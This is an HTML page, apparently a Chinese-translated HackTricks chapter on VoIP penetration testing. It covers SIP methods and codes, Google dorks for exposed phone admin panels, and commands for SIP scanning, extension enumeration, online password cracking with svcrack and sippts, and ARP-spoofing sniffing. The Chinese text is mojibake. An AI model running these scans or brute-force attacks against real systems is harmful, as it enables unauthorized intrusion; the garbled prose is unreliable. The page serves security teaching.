<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Pentesting VoIP</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="pentesting-voip"><a class="header" href="#pentesting-voip">Pentesting VoIP</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <strong>ä¸Šå…³æ³¨æˆ‘ä»¬</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
<p><strong>ä»é»‘å®¢çš„è§’åº¦çœ‹å¾…æ‚¨çš„ç½‘ç»œåº”ç”¨ã€ç½‘ç»œå’Œäº‘</strong></p>
<p><strong>å‘ç°å¹¶æŠ¥å‘Šå…·æœ‰å®é™…å•†ä¸šå½±å“çš„å…³é”®å¯åˆ©ç”¨æ¼æ´ã€‚</strong> ä½¿ç”¨æˆ‘ä»¬ 20 å¤šä¸ªè‡ªå®šä¹‰å·¥å…·æ¥æ˜ å°„æ”»å‡»é¢ï¼ŒæŸ¥æ‰¾è®©æ‚¨æå‡æƒé™çš„å®‰å…¨é—®é¢˜ï¼Œå¹¶ä½¿ç”¨è‡ªåŠ¨åŒ–æ¼æ´æ”¶é›†é‡è¦è¯æ®ï¼Œå°†æ‚¨çš„è¾›å‹¤å·¥ä½œè½¬åŒ–ä¸ºæœ‰è¯´æœåŠ›çš„æŠ¥å‘Šã€‚</p>
<p>{% embed url="https://pentest-tools.com/?utm_term=jul2024&amp;utm_medium=link&amp;utm_source=hacktricks&amp;utm_campaign=spons" %}</p>
<h2 id="voip-åŸºæœ¬ä¿¡æ¯"><a class="header" href="#voip-åŸºæœ¬ä¿¡æ¯">VoIP åŸºæœ¬ä¿¡æ¯</a></h2>
<p>è¦å¼€å§‹äº†è§£ VoIP çš„å·¥ä½œåŸç†ï¼Œè¯·æŸ¥çœ‹ï¼š</p>
<p>{% content-ref url="basic-voip-protocols/" %}
<a href="basic-voip-protocols/">basic-voip-protocols</a>
{% endcontent-ref %}</p>
<h2 id="åŸºæœ¬æ¶ˆæ¯"><a class="header" href="#åŸºæœ¬æ¶ˆæ¯">åŸºæœ¬æ¶ˆæ¯</a></h2>
<pre><code>Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
</code></pre>
<h2 id="å“åº”ä»£ç "><a class="header" href="#å“åº”ä»£ç ">å“åº”ä»£ç </a></h2>
<p><strong>1xxâ€”ä¸´æ—¶å“åº”</strong></p>
<pre><code>100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
</code></pre>
<p><strong>2xxâ€”æˆåŠŸå“åº”</strong></p>
<pre><code>200 OK
202 Accepted
204 No Notification
</code></pre>
<p><strong>3xxâ€”é‡å®šå‘å“åº”</strong></p>
<pre><code>300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
</code></pre>
<p><strong>4xxâ€”å®¢æˆ·ç«¯å¤±è´¥å“åº”</strong></p>
<pre><code>400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
</code></pre>
<p><strong>5xxâ€”æœåŠ¡å™¨æ•…éšœå“åº”</strong></p>
<pre><code>500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
</code></pre>
<p><strong>6xxâ€”å…¨å±€å¤±è´¥å“åº”</strong></p>
<pre><code>600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
</code></pre>
<h2 id="voip-enumeration"><a class="header" href="#voip-enumeration">VoIP Enumeration</a></h2>
<h3 id="ç”µè¯å·ç "><a class="header" href="#ç”µè¯å·ç ">ç”µè¯å·ç </a></h3>
<p>çº¢é˜Ÿå¯ä»¥é‡‡å–çš„ç¬¬ä¸€æ­¥æ˜¯ä½¿ç”¨OSINTå·¥å…·ã€è°·æ­Œæœç´¢æˆ–æŠ“å–ç½‘é¡µæ¥æœç´¢å¯ç”¨çš„ç”µè¯å·ç ä»¥è”ç³»å…¬å¸ã€‚</p>
<p>ä¸€æ—¦ä½ æœ‰äº†ç”µè¯å·ç ï¼Œä½ å¯ä»¥ä½¿ç”¨åœ¨çº¿æœåŠ¡æ¥è¯†åˆ«è¿è¥å•†ï¼š</p>
<ul>
<li><a href="https://www.numberingplans.com/?page=analysis&amp;sub=phonenr">https://www.numberingplans.com/?page=analysis&amp;sub=phonenr</a></li>
<li><a href="https://mobilenumbertracker.com/">https://mobilenumbertracker.com/</a></li>
<li><a href="https://www.whitepages.com/">https://www.whitepages.com/</a></li>
<li><a href="https://www.twilio.com/lookup">https://www.twilio.com/lookup</a></li>
</ul>
<p>çŸ¥é“è¿è¥å•†æ˜¯å¦æä¾›VoIPæœåŠ¡ï¼Œä½ å¯ä»¥ç¡®å®šå…¬å¸æ˜¯å¦åœ¨ä½¿ç”¨VoIPâ€¦â€¦æ­¤å¤–ï¼Œå…¬å¸å¯èƒ½æ²¡æœ‰é›‡ä½£VoIPæœåŠ¡ï¼Œè€Œæ˜¯ä½¿ç”¨PSTNå¡å°†è‡ªå·±çš„VoIP PBXè¿æ¥åˆ°ä¼ ç»Ÿç”µè¯ç½‘ç»œã€‚</p>
<p>è¯¸å¦‚è‡ªåŠ¨éŸ³ä¹å“åº”ç­‰æƒ…å†µé€šå¸¸è¡¨æ˜æ­£åœ¨ä½¿ç”¨VoIPã€‚</p>
<h3 id="google-dorks"><a class="header" href="#google-dorks">Google Dorks</a></h3>
<pre><code class="language-bash"># Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password &amp; intext:"Grandstream Device Configuration" &amp; intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP &amp; phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
</code></pre>
<h3 id="osint-ä¿¡æ¯"><a class="header" href="#osint-ä¿¡æ¯">OSINT ä¿¡æ¯</a></h3>
<p>ä»»ä½•å…¶ä»–æœ‰åŠ©äºè¯†åˆ«æ‰€ä½¿ç”¨çš„ VoIP è½¯ä»¶çš„ OSINT æšä¸¾å¯¹çº¢é˜Ÿéƒ½æ˜¯æœ‰å¸®åŠ©çš„ã€‚</p>
<h3 id="ç½‘ç»œæšä¸¾"><a class="header" href="#ç½‘ç»œæšä¸¾">ç½‘ç»œæšä¸¾</a></h3>
<ul>
<li><strong><code>nmap</code></strong> èƒ½å¤Ÿæ‰«æ UDP æœåŠ¡ï¼Œä½†ç”±äºæ‰«æçš„ UDP æœåŠ¡æ•°é‡è¾ƒå¤šï¼Œå®ƒçš„é€Ÿåº¦éå¸¸æ…¢ï¼Œå¹¶ä¸”åœ¨è¿™ç±»æœåŠ¡ä¸Šå¯èƒ½ä¸å¤ªå‡†ç¡®ã€‚</li>
</ul>
<pre><code class="language-bash">sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
</code></pre>
<ul>
<li><strong><code>svmap</code></strong> æ¥è‡ª SIPVicious (<code>sudo apt install sipvicious</code>): å°†åœ¨æŒ‡å®šç½‘ç»œä¸­å®šä½ SIP æœåŠ¡ã€‚</li>
<li><code>svmap</code> <strong>å®¹æ˜“è¢«é˜»æ­¢</strong>ï¼Œå› ä¸ºå®ƒä½¿ç”¨äº† User-Agent <code>friendly-scanner</code>ï¼Œä½†ä½ å¯ä»¥ä¿®æ”¹ <code>/usr/share/sipvicious/sipvicious</code> ä¸­çš„ä»£ç å¹¶è¿›è¡Œæ›´æ”¹ã€‚</li>
</ul>
<pre><code class="language-bash"># Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
</code></pre>
<ul>
<li><strong><code>SIPPTS scan</code></strong> from <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTSæ‰«ææ˜¯ä¸€ä¸ªéå¸¸å¿«é€Ÿçš„SIPæœåŠ¡æ‰«æå™¨ï¼Œæ”¯æŒUDPã€TCPæˆ–TLSã€‚å®ƒä½¿ç”¨å¤šçº¿ç¨‹ï¼Œå¯ä»¥æ‰«æå¤§èŒƒå›´çš„ç½‘ç»œã€‚å®ƒå…è®¸è½»æ¾æŒ‡ç¤ºç«¯å£èŒƒå›´ï¼Œæ‰«æTCPå’ŒUDPï¼Œä½¿ç”¨å…¶ä»–æ–¹æ³•ï¼ˆé»˜è®¤æƒ…å†µä¸‹å°†ä½¿ç”¨OPTIONSï¼‰å¹¶æŒ‡å®šä¸åŒçš„User-Agentï¼ˆç­‰ç­‰ï¼‰ã€‚</li>
</ul>
<pre><code class="language-bash">sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
</code></pre>
<ul>
<li><strong>metasploit</strong>:</li>
</ul>
<pre><code>auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
</code></pre>
<h4 id="é¢å¤–çš„ç½‘ç»œæšä¸¾"><a class="header" href="#é¢å¤–çš„ç½‘ç»œæšä¸¾">é¢å¤–çš„ç½‘ç»œæšä¸¾</a></h4>
<p>PBX è¿˜å¯èƒ½æš´éœ²å…¶ä»–ç½‘ç»œæœåŠ¡ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li><strong>69/UDP (TFTP)</strong>: å›ºä»¶æ›´æ–°</li>
<li><strong>80 (HTTP) / 443 (HTTPS)</strong>: ä»ç½‘é¡µç®¡ç†è®¾å¤‡</li>
<li><strong>389 (LDAP)</strong>: å­˜å‚¨ç”¨æˆ·ä¿¡æ¯çš„æ›¿ä»£æ–¹æ¡ˆ</li>
<li><strong>3306 (MySQL)</strong>: MySQL æ•°æ®åº“</li>
<li><strong>5038 (Manager)</strong>: å…è®¸ä»å…¶ä»–å¹³å°ä½¿ç”¨ Asterisk</li>
<li><strong>5222 (XMPP)</strong>: ä½¿ç”¨ Jabber å‘é€æ¶ˆæ¯</li>
<li><strong>5432 (PostgreSQL)</strong>: PostgreSQL æ•°æ®åº“</li>
<li>ä»¥åŠå…¶ä»–...</li>
</ul>
<h3 id="æ–¹æ³•æšä¸¾"><a class="header" href="#æ–¹æ³•æšä¸¾">æ–¹æ³•æšä¸¾</a></h3>
<p>å¯ä»¥ä½¿ç”¨ <code>SIPPTS enumerate</code> ä» <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a> æ‰¾åˆ° <strong>å¯ç”¨çš„æ–¹æ³•</strong>ã€‚</p>
<pre><code class="language-bash">sippts enumerate -i 10.10.0.10
</code></pre>
<h3 id="åˆ†ææœåŠ¡å™¨å“åº”"><a class="header" href="#åˆ†ææœåŠ¡å™¨å“åº”">åˆ†ææœåŠ¡å™¨å“åº”</a></h3>
<p>åˆ†ææœåŠ¡å™¨è¿”å›ç»™æˆ‘ä»¬çš„å¤´éƒ¨ä¿¡æ¯éå¸¸é‡è¦ï¼Œè¿™å–å†³äºæˆ‘ä»¬å‘é€çš„æ¶ˆæ¯å’Œå¤´éƒ¨ç±»å‹ã€‚ä½¿ç”¨æ¥è‡ª <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a> çš„ <code>SIPPTS send</code>ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€ä¸ªæ€§åŒ–æ¶ˆæ¯ï¼Œæ“çºµæ‰€æœ‰å¤´éƒ¨ï¼Œå¹¶åˆ†æå“åº”ã€‚</p>
<pre><code class="language-bash">sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
</code></pre>
<p>å¦‚æœæœåŠ¡å™¨ä½¿ç”¨ websocketsï¼Œè·å–æ•°æ®ä¹Ÿæ˜¯å¯èƒ½çš„ã€‚é€šè¿‡ <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a> ä¸­çš„ <code>SIPPTS wssend</code>ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€ä¸ªæ€§åŒ–çš„ WS æ¶ˆæ¯ã€‚</p>
<pre><code class="language-bash">sippts wssend -i 10.10.0.10 -r 443 -path /ws
</code></pre>
<h3 id="extension-enumeration"><a class="header" href="#extension-enumeration">Extension Enumeration</a></h3>
<p>åœ¨PBXï¼ˆç§äººåˆ†æ”¯äº¤æ¢æœºï¼‰ç³»ç»Ÿä¸­ï¼Œæ‰©å±•æŒ‡çš„æ˜¯<strong>åˆ†é…ç»™ç»„ç»‡æˆ–ä¼ä¸šå†…å„ä¸ª</strong>ç”µè¯çº¿è·¯ã€è®¾å¤‡æˆ–ç”¨æˆ·çš„å”¯ä¸€å†…éƒ¨æ ‡è¯†ç¬¦ã€‚æ‰©å±•ä½¿å¾—<strong>åœ¨ç»„ç»‡å†…éƒ¨é«˜æ•ˆè·¯ç”±ç”µè¯æˆä¸ºå¯èƒ½</strong>ï¼Œæ— éœ€ä¸ºæ¯ä¸ªç”¨æˆ·æˆ–è®¾å¤‡æä¾›å•ç‹¬çš„å¤–éƒ¨ç”µè¯å·ç ã€‚</p>
<ul>
<li><strong><code>svwar</code></strong> æ¥è‡ªSIPViciousï¼ˆ<code>sudo apt install sipvicious</code>ï¼‰ï¼š<code>svwar</code>æ˜¯ä¸€ä¸ªå…è´¹çš„SIP PBXæ‰©å±•çº¿è·¯æ‰«æå™¨ã€‚åœ¨æ¦‚å¿µä¸Šï¼Œå®ƒçš„å·¥ä½œæ–¹å¼ç±»ä¼¼äºä¼ ç»Ÿçš„æ‹¨å·å™¨ï¼Œé€šè¿‡<strong>çŒœæµ‹ä¸€ç³»åˆ—æ‰©å±•æˆ–ç»™å®šçš„æ‰©å±•åˆ—è¡¨</strong>ã€‚</li>
</ul>
<pre><code class="language-bash">svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
</code></pre>
<ul>
<li><strong><code>SIPPTS exten</code></strong> æ¥è‡ª <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS exten ç”¨äºè¯†åˆ« SIP æœåŠ¡å™¨ä¸Šçš„æ‰©å±•ã€‚Sipexten å¯ä»¥æ£€æŸ¥å¤§èŒƒå›´çš„ç½‘ç»œå’Œç«¯å£ã€‚</li>
</ul>
<pre><code class="language-bash">sippts exten -i 10.10.0.10 -r 5060 -e 100-200
</code></pre>
<ul>
<li><strong>metasploit</strong>: ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ metasploit æšä¸¾æ‰©å±•/ç”¨æˆ·åï¼š</li>
</ul>
<pre><code>auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
</code></pre>
<ul>
<li><strong><code>enumiax</code> (<code>apt install enumiax</code>): enumIAX</strong> æ˜¯ä¸€ä¸ª Inter Asterisk Exchange åè®® <strong>ç”¨æˆ·åæš´åŠ›ç ´è§£æšä¸¾å™¨</strong>ã€‚enumIAX å¯ä»¥åœ¨ä¸¤ç§ä¸åŒæ¨¡å¼ä¸‹æ“ä½œï¼šé¡ºåºç”¨æˆ·åçŒœæµ‹æˆ–å­—å…¸æ”»å‡»ã€‚</li>
</ul>
<pre><code class="language-bash">enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
</code></pre>
<h2 id="voip-æ”»å‡»"><a class="header" href="#voip-æ”»å‡»">VoIP æ”»å‡»</a></h2>
<h3 id="å¯†ç æš´åŠ›ç ´è§£---åœ¨çº¿"><a class="header" href="#å¯†ç æš´åŠ›ç ´è§£---åœ¨çº¿">å¯†ç æš´åŠ›ç ´è§£ - åœ¨çº¿</a></h3>
<p>åœ¨å‘ç°äº† <strong>PBX</strong> å’Œä¸€äº› <strong>åˆ†æœº/ç”¨æˆ·å</strong> åï¼Œçº¢é˜Ÿå¯ä»¥å°è¯•é€šè¿‡ <code>REGISTER</code> æ–¹æ³•å¯¹åˆ†æœºè¿›è¡Œèº«ä»½éªŒè¯ï¼Œä½¿ç”¨å¸¸è§å¯†ç çš„å­—å…¸è¿›è¡Œæš´åŠ›ç ´è§£ã€‚</p>
<p>{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œ<strong>ç”¨æˆ·å</strong> å¯ä»¥ä¸åˆ†æœºç›¸åŒï¼Œä½†è¿™ç§åšæ³•å¯èƒ½ä¼šå›  PBX ç³»ç»Ÿã€å…¶é…ç½®å’Œç»„ç»‡çš„åå¥½è€Œæœ‰æ‰€ä¸åŒ...</p>
<p>å¦‚æœç”¨æˆ·åä¸åˆ†æœºä¸åŒï¼Œæ‚¨éœ€è¦ <strong>æ‰¾å‡ºç”¨æˆ·åä»¥è¿›è¡Œæš´åŠ›ç ´è§£</strong>ã€‚
{% endhint %}</p>
<ul>
<li><strong><code>svcrack</code></strong> æ¥è‡ª SIPVicious ï¼ˆ<code>sudo apt install sipvicious</code>ï¼‰ï¼šSVCrack å…è®¸æ‚¨ç ´è§£ PBX ä¸Šç‰¹å®šç”¨æˆ·å/åˆ†æœºçš„å¯†ç ã€‚</li>
</ul>
<pre><code class="language-bash">svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
</code></pre>
<ul>
<li><strong><code>SIPPTS rcrack</code></strong> æ¥è‡ª <a href="https://github.com/Pepelux/sippts"><strong>sippts</strong></a><strong>:</strong> SIPPTS rcrack æ˜¯ä¸€ä¸ªç”¨äº SIP æœåŠ¡çš„è¿œç¨‹å¯†ç ç ´è§£å·¥å…·ã€‚Rcrack å¯ä»¥åœ¨ä¸åŒçš„ IP å’Œç«¯å£èŒƒå›´å†…æµ‹è¯•å¤šä¸ªç”¨æˆ·çš„å¯†ç ã€‚</li>
</ul>
<pre><code class="language-bash">sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
</code></pre>
<ul>
<li><strong>Metasploit</strong>:</li>
<li><a href="https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb">https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb</a></li>
<li><a href="https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb">https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb</a></li>
</ul>
<h3 id="voipå—…æ¢"><a class="header" href="#voipå—…æ¢">VoIPå—…æ¢</a></h3>
<p>å¦‚æœä½ åœ¨<strong>å¼€æ”¾Wifiç½‘ç»œ</strong>ä¸­å‘ç°VoIPè®¾å¤‡ï¼Œä½ å¯ä»¥<strong>å—…æ¢æ‰€æœ‰ä¿¡æ¯</strong>ã€‚æ­¤å¤–ï¼Œå¦‚æœä½ åœ¨ä¸€ä¸ªæ›´å°é—­çš„ç½‘ç»œä¸­ï¼ˆé€šè¿‡ä»¥å¤ªç½‘è¿æ¥æˆ–å—ä¿æŠ¤çš„Wifiï¼‰ï¼Œä½ å¯ä»¥åœ¨<strong>PBXå’Œç½‘å…³</strong>ä¹‹é—´æ‰§è¡Œ<strong>MitMæ”»å‡»ï¼Œä¾‹å¦‚</strong> <a href="../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing"><strong>ARPspoofing</strong></a>ä»¥å—…æ¢ä¿¡æ¯ã€‚</p>
<p>åœ¨ç½‘ç»œä¿¡æ¯ä¸­ï¼Œä½ å¯èƒ½ä¼šæ‰¾åˆ°<strong>ç®¡ç†è®¾å¤‡çš„ç½‘é¡µå‡­æ®</strong>ã€ç”¨æˆ·<strong>åˆ†æœº</strong>ã€<strong>ç”¨æˆ·å</strong>ã€<strong>IP</strong>åœ°å€ï¼Œç”šè‡³<strong>å“ˆå¸Œå¯†ç </strong>å’Œ<strong>RTPæ•°æ®åŒ…</strong>ï¼Œä½ å¯ä»¥é‡æ”¾è¿™äº›æ•°æ®åŒ…ä»¥<strong>å¬åˆ°å¯¹è¯</strong>ï¼Œç­‰ç­‰ã€‚</p>
